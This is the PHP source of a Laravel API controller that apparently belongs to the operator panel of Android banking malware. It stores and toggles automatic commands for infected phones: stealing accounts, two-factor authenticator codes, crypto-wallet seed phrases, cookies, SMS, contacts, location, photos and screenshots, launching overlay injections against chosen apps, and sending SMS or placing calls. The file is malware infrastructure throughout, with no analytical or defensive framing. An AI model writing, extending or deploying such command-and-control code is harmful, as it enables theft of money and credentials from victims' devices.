<?php

namespace App\Http\Controllers\Api\v1;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Models\AutoCommand;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Validation\Rule;
use Illuminate\Validation\ValidationException;

class AutoCommandsController extends Controller
{
    public function index(): ApiResponse
    {
        $autoCommands = AutoCommand::firstOrFail();

        return ApiResponse::success($autoCommands->data);
    }

    /**
     * @throws ValidationException
     */
    public function update(Request $request): ApiResponse
    {
        $this->validate($request, [
            'data' => 'array|required',

            'data.getaccounts' => 'array|required',
            'data.getaccounts.enabled' => 'boolean|required',

            'data.getinstallapps' => 'array|required',
            'data.getinstallapps.enabled' => 'boolean|required',

            'data.updateinjectandlistapps' => 'array|required',
            'data.updateinjectandlistapps.enabled' => 'boolean|required',

            'data.googleAuthGrabber' => 'array|required',
            'data.googleAuthGrabber.enabled' => 'boolean|required',

            'data.calling' => 'array|required',
            'data.calling.enabled' => 'boolean|required',
            'data.calling.number' => 'string|nullable|',
            'data.calling.locked' => 'boolean|required',

            'data.startinject' => 'array|required',
            'data.startinject.enabled' => 'boolean|required',
            'data.startinject.application' => 'string|nullable',

            'data.push' => 'array|required',
            'data.push.enabled' => 'boolean|required',
            'data.push.text' => 'string|nullable',
            'data.push.title' => 'string|nullable',
            'data.push.application' => 'string|nullable',

            'data.sendsms' => 'array|required',
            'data.sendsms.enabled' => 'boolean|required',
            'data.sendsms.number' => 'string|nullable',
            'data.sendsms.message' => 'string|nullable',

            'data.seedPhrase' => 'array|required',
            'data.seedPhrase.enabled' => 'boolean|required',
            'data.seedPhrase.wallets' => 'array',
            'data.seedPhrase.wallets.*' => 'string',

            'data.clearcache' => 'array|required',
            'data.clearcache.enabled' => 'boolean|required',
            'data.clearcache.application' => 'string|nullable',

            'data.runApp' => 'array|required',
            'data.runApp.enabled' => 'boolean|required',
            'data.runApp.application' => 'string|nullable',

            'data.deleteapplication' => 'array|required',
            'data.deleteapplication.enabled' => 'boolean|required',
            'data.deleteapplication.application' => 'string|nullable',

            'data.openurl' => 'array|required',
            'data.openurl.enabled' => 'boolean|required',
            'data.openurl.url' => 'string|nullable',

            'data.getcallhistory' => 'array|required',
            'data.getcallhistory.enabled' => 'boolean|required',

            'data.getcontacts' => 'array|required',
            'data.getcontacts.enabled' => 'boolean|required',

            'data.getlocation' => 'array|required',
            'data.getlocation.enabled' => 'boolean|required',

            'data.getimages' => 'array|required',
            'data.getimages.enabled' => 'boolean|required',

            'data.getsms' => 'array|required',
            'data.getsms.enabled' => 'boolean|required',

            'data.takescreenshot' => 'array|required',
            'data.takescreenshot.enabled' => 'boolean|required',

            'data.startauthenticator2' => 'array|required',
            'data.startauthenticator2.enabled' => 'boolean|required',

            'data.protect' => 'array|required',
            'data.protect.enabled' => 'boolean|required',

            'data.cookie' => 'array|required',
            'data.cookie.enabled' => 'boolean|required',

            'data.takephoto' => 'array|required',
            'data.takephoto.enabled' => 'boolean|required',
        ]);

        $autoCommands = AutoCommand::firstOrCreate();
        $autoCommands->data = $request->get('data');
        $autoCommands->save();

        return ApiResponse::success($autoCommands->data);
    }

    /**
     * @throws ValidationException
     */
    public function updateEnabled(Request $request): ApiResponse
    {
        $autoCommands = AutoCommand::firstOrCreate();

        $this->validate($request, [
            'command' => [
                Rule::in(array_keys($autoCommands->data)),
                'string',
            ],
            'enabled' => 'boolean',
        ]);

        try {
            $autoCommands->data[$request->get('command')]['enabled'] = $request->get('enabled');
            $autoCommands->save();
        } catch (Exception) {
        }

        return ApiResponse::success($autoCommands->data);
    }
}
